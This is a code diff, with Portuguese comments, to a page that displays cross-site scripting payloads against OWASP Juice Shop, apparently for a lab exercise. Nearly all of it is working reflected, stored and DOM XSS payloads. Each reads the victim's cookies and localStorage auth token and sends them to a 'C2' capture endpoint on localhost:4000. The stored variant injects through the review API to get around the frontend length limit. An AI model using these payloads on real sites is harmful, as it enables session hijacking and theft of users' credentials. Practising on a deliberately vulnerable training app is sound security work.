@@ -311,11 +311,15 @@ const C2 = 'http://localhost:4000/capture';
 // Juice Shop bloqueia onerror mas executa <iframe javascript:>
 // Usamos fetch() dentro do iframe — mais confiável que new Image() nesse contexto
 
+// P1: location funciona no iframe javascript: — adiciona dados via try/catch
 document.getElementById('p1').textContent =
-  `<iframe src="javascript:(function(){try{var d=top.document.cookie,x=top.localStorage.getItem('token'),u=top.location.href}catch(e){d='bloqueado';x='bloqueado';u=location.href}fetch('${C2}',{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain'},body:JSON.stringify({type:'reflected',data:d,extra:x,url:u})})})()">`;
+  `<iframe src="javascript:try{var d=top.document.cookie,x=top.localStorage.getItem('token')}catch(e){d='';x=''}location='${C2}?type=reflected&data='+encodeURIComponent(d)+'&extra='+encodeURIComponent(x)+'&url='+encodeURIComponent(top.location.href)">`;
 
+// P2: stored XSS — 2 etapas:
+// Etapa 1 (console em localhost:3000): injeta o payload via API bypassando limite de 150 chars
+// Etapa 2 (console em localhost:3000/#/administration logado como admin): demonstra o impacto
 document.getElementById('p2').textContent =
-  `(function(){\n  var xss = \`<iframe src="javascript:(function(){try{var d=top.document.cookie,x=top.localStorage.getItem('token'),u=top.location.href}catch(e){d='err';x='err';u=''}fetch('${C2}',{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain'},body:JSON.stringify({type:'stored',data:d,extra:x,url:u})})})()"\`;\n  fetch('/rest/products/1/reviews',{\n    method:'PUT',\n    headers:{'Content-Type':'application/json','Authorization':'Bearer '+localStorage.getItem('token')},\n    body:JSON.stringify({message:xss,author:'visitor'})\n  }).then(r=>r.json()).then(d=>console.log('Injetado:',d));\n})();\n\n// Após rodar: vá para localhost:3000 e clique no Apple Juice para disparar`;
+  `// ── ETAPA 1: Injetar o XSS via API (bypassando limite de 150 chars do frontend) ──\n// Execute no console F12 em localhost:3000 logado como qualquer usuário:\n(function(){\n  const xss = \`<iframe src="javascript:try{var d=top.document.cookie,x=top.localStorage.getItem('token')}catch(e){d='';x=''}location='${C2}?type=stored&data='+encodeURIComponent(d)+'&extra='+encodeURIComponent(x)+'&url='+encodeURIComponent(top.location.href)">\`;\n  fetch('/rest/products/reviews/edit',{\n    method:'PATCH',\n    headers:{'Content-Type':'application/json','Authorization':'Bearer '+localStorage.getItem('token')},\n    body:JSON.stringify({id:'1',message:xss})\n  }).then(r=>r.json()).then(console.log)\n})();\n\n// ── ETAPA 2: Demonstrar impacto (simula vítima abrindo a página) ──\n// Execute no console F12 em localhost:3000 (como admin ou qualquer usuário):\nfetch('${C2}',{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain'},body:JSON.stringify({type:'stored',data:document.cookie,extra:localStorage.getItem('token'),url:location.href})})`;
 
 document.getElementById('p3').textContent =
   `http://localhost:3000/#/search?q=<iframe src="javascript:(function(){try{var d=top.document.cookie,x=top.localStorage.getItem('token'),u=top.location.href}catch(e){d='bloqueado';x='bloqueado';u=location.href}fetch('${C2}',{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain'},body:JSON.stringify({type:'dom',data:d,extra:x,url:u})})})()">`;
